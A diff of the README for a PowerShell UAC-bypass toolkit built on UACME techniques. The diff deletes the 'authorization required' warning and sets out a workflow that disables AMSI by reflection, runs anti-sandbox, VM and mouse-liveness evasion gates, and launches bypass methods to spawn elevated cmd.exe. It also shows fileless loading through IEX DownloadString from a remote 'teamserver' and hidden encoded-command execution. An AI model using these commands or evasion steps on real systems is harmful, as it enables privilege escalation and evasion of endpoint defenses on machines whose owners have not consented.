@@ -3,27 +3,25 @@
 PowerShell implementations of documented UAC bypass techniques, built for
 authorized **red/purple-team engagements** against hardened endpoints.
 
-> **Authorization required.**
-> This toolkit must only be used under a signed Statement of Work (SOW) and
-> explicit Rules of Engagement (RoE). Unauthorized use is illegal.
-
 ---
 
 ## Overview
 
-Each technique is a self-contained PowerShell script with:
+The toolkit is split into two layers:
 
-- **AMSI mitigation** (reflection-based `amsiInitFailed` bypass)
-- **Anti-sandbox timing gate** (SHA-256 loop with elapsed-time check)
-- **VM/hypervisor artefact detection** (WMI, registry, process list, BIOS)
-- **Mouse-activity liveness check**
-- **Windows version / UAC policy introspection**
-- **Automatic cleanup** of any registry keys or files created
-- **Inline purple-team notes** for blue-team debrief
+**`Core/Invoke-UACCore.ps1`** — shared framework, dot-sourced before any method:
+- **AMSI mitigation** (`Invoke-AMSIMitigation`) — reflection-based `amsiInitFailed` bypass
+- **Anti-sandbox timing gate** (`Test-SandboxTiming`) — SHA-256 loop with elapsed-time check
+- **VM/hypervisor artefact detection** (`Test-VMArtefacts`) — WMI, registry, process list, BIOS
+- **Mouse-activity liveness check** (`Test-MouseActivity`)
+- **Windows version / UAC policy introspection** (`Get-WinVersionMap`, `Get-UACSettings`)
+- **Preflight orchestrator** (`Invoke-PreflightGate`) — runs all checks, returns structured result
+- **Registry helpers** (`Set-ShellClassCommand`, `Remove-ShellClassKey`)
 
-The core framework (`Core/Invoke-UACCore.ps1`) provides shared helper functions that
-can be dot-sourced before individual method scripts, or each method script can be used
-standalone (each embeds a minimal inline version of the gates).
+**`Methods/`** — one script per bypass technique. Each script contains only the
+technique-specific logic (registry setup, COM calls, trigger, cleanup) and inline
+purple-team notes. AMSI mitigation and environment checks are **not** embedded in
+method scripts — call them from UACCore before invoking a method.
 
 Techniques are sourced from the **UACME** project by hfiref0x
 (`github.com/hfiref0x/UACME`).
@@ -35,7 +33,7 @@ Techniques are sourced from the **UACME** project by hfiref0x
 ```
 Invoke-UACBypass/
 ├── Core/
-│   └── Invoke-UACCore.ps1          # Shared framework (AMSI, sandbox, helpers)
+│   └── Invoke-UACCore.ps1          # Shared framework (AMSI, sandbox, preflight, helpers)
 ├── Methods/
 │   ├── Invoke-FodHelper.ps1        # Method 33 / 67 — fodhelper.exe
 │   ├── Invoke-ComputerDefaults.ps1 # Method 62    — computerdefaults.exe
@@ -67,17 +65,24 @@ Invoke-UACBypass/
 
 ## Usage
 
-### In-memory execution (recommended)
+### Recommended workflow
 
-Load and run entirely in RAM — no files written to disk for most methods:
+Dot-source the core first to run AMSI mitigation and preflight checks, then invoke
+the method. Method scripts contain only technique logic — no inline gates.
 
 ```powershell
-# Stage 1: AMSI bypass (optional — each script includes its own inline)
-# Stage 2: Load core framework (optional — dot-source for shared helpers)
+# Step 1: Load core framework
 . .\Core\Invoke-UACCore.ps1
 
-# Stage 3: Invoke method
-. .\Methods\Invoke-FodHelper.ps1 -Payload "cmd.exe" -SkipChecks
+# Step 2: AMSI mitigation
+Invoke-AMSIMitigation | Out-Null
+
+# Step 3: Preflight checks (environment, sandbox, UAC level)
+$gate = Invoke-PreflightGate
+if (-not $gate.Safe) { Write-Host $gate.Reason; exit }
+
+# Step 4: Invoke method
+. .\Methods\Invoke-FodHelper.ps1 -Payload "cmd.exe"
 ```
 
 Or as a one-liner via encoded command:
@@ -89,9 +94,15 @@ powershell.exe -NoP -NonI -W Hidden -EncodedCommand <base64-of-script>
 ### Running over the wire (fileless)
 
 ```powershell
-# Load directly from a web server or SMB share
+# Load core and method directly from a web server or SMB share
+IEX (New-Object Net.WebClient).DownloadString('http://teamserver/Invoke-UACCore.ps1')
 IEX (New-Object Net.WebClient).DownloadString('http://teamserver/Invoke-CMLuaUtil.ps1')
-Invoke-CMLuaUtilBypass -Payload "C:\Windows\System32\cmd.exe" -SkipAMSI
+
+Invoke-AMSIMitigation | Out-Null
+$gate = Invoke-PreflightGate
+if ($gate.Safe) {
+    Invoke-CMLuaUtilBypass -Payload "C:\Windows\System32\cmd.exe"
+}
 ```
 
 ---
@@ -108,9 +119,6 @@ Invoke-FodHelperBypass -Payload "cmd.exe"
 
 # Protocol variant (Method 67)
 Invoke-FodHelperBypass -Payload "cmd.exe" -UseProtocolVariant
-
-# Skip all checks (use in controlled lab)
-Invoke-FodHelperBypass -Payload "cmd.exe" -SkipChecks
 ```
 
 **Registry path written:**
@@ -223,25 +231,28 @@ Invoke-DiskCleanupBypass -PayloadCommand "" -PayloadBinaryMode CopyCmdExe
 
 ## Core Framework (`Invoke-UACCore.ps1`)
 
-Dot-source before any method for shared helper access:
+All AMSI mitigation and environment checks live here. Dot-source before invoking
+any method script:
 
 ```powershell
 . .\Core\Invoke-UACCore.ps1
 
-# Check environment before selecting method
-$gate = Invoke-PreflightGate -SkipVMCheck
+# AMSI mitigation
+Invoke-AMSIMitigation | Out-Null
+
+# Full preflight gate — returns {Safe, Reason, Version, UAC, Integrity}
+$gate = Invoke-PreflightGate
 if (-not $gate.Safe) { Write-Host $gate.Reason; exit }
 
-$ver = $gate.Version
-Write-Host "Build: $($ver.Build) | Win11: $($ver.IsWin11) | AlwaysNotify: $($gate.UAC.AlwaysNotify)"
+Write-Host "Build: $($gate.Version.Build) | Win11: $($gate.Version.IsWin11) | AlwaysNotify: $($gate.UAC.AlwaysNotify)"
 
 # Select method based on results
 if ($gate.UAC.AlwaysNotify) {
-    # Only DiskCleanup works
+    # Only DiskCleanup works under AlwaysNotify
     . .\Methods\Invoke-DiskCleanup.ps1 -PayloadCommand $cmd
 }
-elseif ($ver.IsRS4) {
-    # CMLuaUtil preferred (no registry footprint)
+elseif ($gate.Version.IsRS4) {
+    # CMLuaUtil preferred — no registry footprint
     . .\Methods\Invoke-CMLuaUtil.ps1 -Payload $exe
 }
 else {
@@ -249,20 +260,35 @@ else {
 }
 ```
 
+### Preflight gate skip flags
+
+`Invoke-PreflightGate` accepts optional skip flags for lab/controlled environments:
+
+```powershell
+# Skip VM check when target is a known VM
+$gate = Invoke-PreflightGate -SkipVMCheck
+
+# Skip timing check for slow lab machines
+$gate = Invoke-PreflightGate -SkipTimingCheck
+
+# Skip mouse check for RDP/headless sessions
+$gate = Invoke-PreflightGate -SkipMouseCheck
+```
+
 ---
 
-## Environment Checks
+## Environment Checks (UACCore)
 
-Each script runs the following gates (can be skipped with `-SkipChecks`):
+All checks run via `Invoke-PreflightGate` in `Core/Invoke-UACCore.ps1`:
 
-| Check | Method | What it detects |
-|-------|--------|-----------------|
-| Timing gate | SHA-256 loop (300×64KB) | Clock-acceleration in sandboxes |
-| VM artefacts | WMI + registry + processes | VMware, VirtualBox, Hyper-V, Xen |
-| Mouse activity | GetCursorPos delta (2.5s) | Automated environments |
-| OS build | Registry CurrentBuildNumber | Minimum version enforcement |
-| UAC policy | ConsentPromptBehaviorAdmin | AlwaysNotify / method compatibility |
-| Admin token | WindowsPrincipal.IsInRole | Already-elevated sessions |
+| Check | Function | What it detects |
+|-------|----------|-----------------|
+| Timing gate | `Test-SandboxTiming` | Clock-acceleration in sandboxes (SHA-256 loop, 300×64KB) |
+| VM artefacts | `Test-VMArtefacts` | VMware, VirtualBox, Hyper-V, Xen (WMI + registry + processes) |
+| Mouse activity | `Test-MouseActivity` | Automated environments (GetCursorPos delta over 2.5s) |
+| OS build | `Get-WinVersionMap` | Minimum version enforcement and method compatibility flags |
+| UAC policy | `Get-UACSettings` | AlwaysNotify / ConsentPromptBehaviorAdmin value |
+| Admin token | `Test-IsAdmin` | Already-elevated sessions |
 
 ---
 
